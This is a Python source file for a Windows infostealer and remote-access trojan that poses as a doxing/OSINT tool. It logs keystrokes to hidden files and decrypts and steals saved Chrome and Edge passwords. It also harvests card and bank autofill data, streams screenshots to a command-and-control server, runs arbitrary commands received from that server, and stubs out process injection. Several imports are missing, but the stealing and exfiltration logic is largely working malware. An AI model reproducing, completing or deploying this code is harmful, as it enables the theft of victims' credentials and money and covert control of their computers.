import os
import sys
import socket
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES
import requests
import threading
import time
import platform
import asyncio
import re
from pynput.keyboard import Key, Listener
import psutil
import win32api
import win32con
import win32process
import win32gui  # Added missing import

# Config - Replace with your C2 server
C2_SERVER = "http://your_malicious_c2:5000"
KEYLOG_FILE = os.path.join(os.getenv("APPDATA"), "syslog.dat")  # Hidden keylog
DATA_DIR = os.path.join(os.getenv("APPDATA"), ".syscache")  # Disguised dir
VICTIM_ID = socket.gethostname() + "_" + os.urandom(4).hex()

# Ensure data dir exists (hidden)
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR, exist_ok=True)
    win32api.SetFileAttributes(DATA_DIR, win32con.FILE_ATTRIBUTE_HIDDEN)

# Keylogger (Stealthy)
def on_press(key):
    with open(KEYLOG_FILE, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f"[{key}]")
    f.close()
    win32api.SetFileAttributes(KEYLOG_FILE, win32con.FILE_ATTRIBUTE_HIDDEN)

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Steal Browser Data (Chrome, Edge)
def get_encryption_key(browser):
    local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), f"{browser}\\User Data\\Local State")
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            key = json.load(f)["os_crypt"]["encrypted_key"]
        key = b64decode(key)[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        return ""

def steal_browser_data():
    browsers = [("Google\\Chrome", "Chrome"), ("Microsoft\\Edge\\User Data", "Edge")]
    all_data = []
    for path, name in browsers:
        key = get_encryption_key(path)
        login_db = os.path.join(os.getenv("LOCALAPPDATA"), f"{path}\\Default\\Login Data")
        if os.path.exists(login_db):
            shutil.copy2(login_db, os.path.join(DATA_DIR, f"{name}_LoginData.db"))
            conn = sqlite3.connect(os.path.join(DATA_DIR, f"{name}_LoginData.db"))
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, username, encrypted_pass in cursor.fetchall():
                password = decrypt_password(encrypted_pass, key) if key else "N/A"
                if username and password != "N/A":
                    all_data.append({"browser": name, "url": url, "username": username, "password": password})
            conn.close()
    with open(os.path.join(DATA_DIR, "stolen_credentials.json"), "w") as f:
        json.dump(all_data, f, indent=4)

# Bank Info (Target Autofill)
def steal_bank_info():
    autofill_db = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Web Data")
    if os.path.exists(autofill_db):
        shutil.copy2(autofill_db, os.path.join(DATA_DIR, "WebData.db"))
        conn = sqlite3.connect(os.path.join(DATA_DIR, "WebData.db"))
        cursor = conn.cursor()
        cursor.execute("SELECT name, value FROM autofill WHERE value LIKE '%card%' OR value LIKE '%bank%'")
        bank_data = [{"field": name, "value": value} for name, value in cursor.fetchall() if value]
        conn.close()
        with open(os.path.join(DATA_DIR, "bank_info.json"), "w") as f:
            json.dump(bank_data, f, indent=4)

# OSINT Disguise (Fake Doxing)
def fake_osint():
    print("SpiderBot Doxing Tool v1.0")
    while True:
        cmd = input("Enter command (ping/ipscan/user): ").lower()
        if cmd == "ping":
            ip = input("Target IP: ")
            result = os.popen(f"ping -n 1 {ip}").read()
            print("Ping result:", "Success" if "TTL" in result else "Failed")
        elif cmd == "ipscan":
            print("Scanning IP range... (Fake output)")
            print("192.168.1.1 - Open")
        elif cmd == "user":
            username = input("Target Username: ")
            print(f"OSINT for {username}: Twitter found, GitHub not found")
        elif cmd == "exit":
            break

# Screen Capture (Live Viewing)
def capture_screen():
    import mss
    sct = mss.mss()
    while True:
        screenshot = sct.grab(sct.monitors[1])
        img = Image.frombytes("RGB", screenshot.size, screenshot.tobytes())
        buf = io.BytesIO()
        img.save(buf, format="JPEG")
        data = buf.getvalue()
        requests.post(f"{C2_SERVER}/screen?id={VICTIM_ID}", files={"screen": ("screen.jpg", data)}, timeout=10)
        time.sleep(1)  # Adjust for performance

# C2 Communication
def send_data(data_type, data):
    try:
        requests.post(f"{C2_SERVER}/data?id={VICTIM_ID}", json={data_type: data}, timeout=10)
    except:
        pass

def receive_commands():
    while True:
        try:
            response = requests.get(f"{C2_SERVER}/commands?id={VICTIM_ID}", timeout=10)
            command = response.json().get("command")
            if command == "screen_start":
                threading.Thread(target=capture_screen, daemon=True).start()
            elif command == "keylog_start":
                threading.Thread(target=start_keylogger, daemon=True).start()
            elif command == "steal_all":
                steal_browser_data()
                steal_bank_info()
                with open(KEYLOG_FILE, "r") as f:
                    send_data("keylog", f.read())
                send_data("credentials", open(os.path.join(DATA_DIR, "stolen_credentials.json")).read())
                send_data("bank_info", open(os.path.join(DATA_DIR, "bank_info.json")).read())
            elif command == "execute":
                cmd = response.json().get("param")
                result = os.popen(cmd).read()
                send_data("cmd_result", result)
            time.sleep(5)
        except:
            time.sleep(5)

# Injection (Basic Windows Example)
def inject_process():
    try:
        # Get foreground window process ID
        hwnd = win32gui.GetForegroundWindow()
        pid = win32process.GetWindowThreadProcessId(hwnd)[1]
        if pid:
            # Open process with full access
            process_handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
            if process_handle:
                # Placeholder for DLL injection (e.g., load a malicious DLL)
                # In a real scenario, use LoadLibrary with a DLL path
                print(f"Injected into PID: {pid}")  # Debug output
                win32api.CloseHandle(process_handle)
    except Exception as e:
        print(f"Injection failed: {e}")

if __name__ == "__main__":
    if platform.system() == "Windows":
        inject_process()
        threading.Thread(target=fake_osint, daemon=True).start()  # Disguise
        threading.Thread(target=receive_commands, daemon=True).start()
        asyncio.run(main())  # Add asyncio for Emscripten if needed
